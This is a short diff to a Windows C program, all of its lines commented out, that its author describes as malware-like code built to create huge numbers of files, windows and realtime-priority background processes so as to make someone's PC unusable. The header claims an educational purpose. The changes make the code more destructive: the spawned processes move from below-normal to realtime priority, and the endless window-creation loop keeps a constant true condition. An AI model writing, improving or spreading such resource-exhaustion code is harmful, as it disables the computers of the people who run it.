@@ -1,3 +1,9 @@
+/* WRITTEN BY ARKA */
+/*THIS WILL CREATE IMMENSE NUMBER OF FILES, HELL LOT OF WINDOWS PROCESS WILL BE RUNNING IN REALTIME IN BG ENOUGH TO MAKE SOMEONES'S PC GRABAGE IN AN INSTNCE THIS IS
+   FOR EDUCATIONAL PURPOSE I DON'T TAKE PLACE ANY OF THESE BAD PARCTICES. */
+
+
+
 // #include <stdio.h>
 // #include <windows.h>
 // void create_files ();
@@ -31,7 +37,7 @@
 //         return EXIT_SUCCESS ;
 //     }
 
-//     while (TRUE){
+//     while (10000){
 //     HWND hnd = CreateWindow(
 //         ws.lpszClassName, TEXT("65-750FX-Gtx000x7F"),WS_VISIBLE | WS_OVERLAPPEDWINDOW , 100,100,500,500,
 //         NULL,NULL,NULL,NULL
@@ -120,7 +126,7 @@
 //             NULL,
 //             NULL,
 //             FALSE,
-//             BELOW_NORMAL_PRIORITY_CLASS,
+//             REALTIME_PRIORITY_CLASS,
 //             NULL,
 //             NULL,
 //             &Si,
